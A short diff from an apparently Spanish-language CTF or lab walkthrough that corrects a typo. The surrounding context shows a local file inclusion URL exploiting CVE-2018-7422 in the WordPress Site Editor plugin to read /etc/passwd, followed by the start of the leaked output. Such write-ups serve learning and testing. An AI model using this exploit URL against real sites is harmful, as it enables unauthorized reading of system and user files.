@@ -178,7 +178,7 @@ Buscando en Internet este plugin y su versión damos con el CVE-2018-7422 el cua
 http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
 ```
 
-De esta manero podremos ver todos los usuarios del sistema.
+De esta manera podremos ver todos los usuarios del sistema.
 
 ```txt
 |root:x:0:0:root:/root:/bin/bash|
